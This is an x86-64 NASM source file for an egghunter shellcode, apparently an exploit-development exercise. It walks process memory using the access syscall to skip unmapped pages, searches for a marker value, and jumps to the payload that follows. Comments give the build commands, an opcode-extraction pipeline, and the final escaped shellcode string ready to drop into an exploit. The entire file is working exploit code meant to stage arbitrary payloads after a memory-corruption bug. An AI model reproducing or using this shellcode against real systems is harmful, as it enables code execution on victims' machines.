global _start
section .text
_start:

;STEP1
	;int access(const char *pathname, int mode);
	xor rsi, rsi
	push rsi
	pop rdi

;STEP2
go_to_next_page:
	or di, 0xfff
	inc rdi

;STEP3
forward_4_bytes:
	xor rax, rax
	mov al, 21
	syscall

;STEP4
efault_check:
	cmp al, 0xf2
	jz go_to_next_page
	mov eax, 0x9050904f
	inc al
	scasd
	jnz forward_4_bytes
	jmp rdi


; =============================================================================================
; nasm -felf64 egghunter.nasm -o egghunter.o
; ld egghunter.o -o egghunter

; Dumped egghunter code:
; objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
;"\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7"
; =============================================================================================
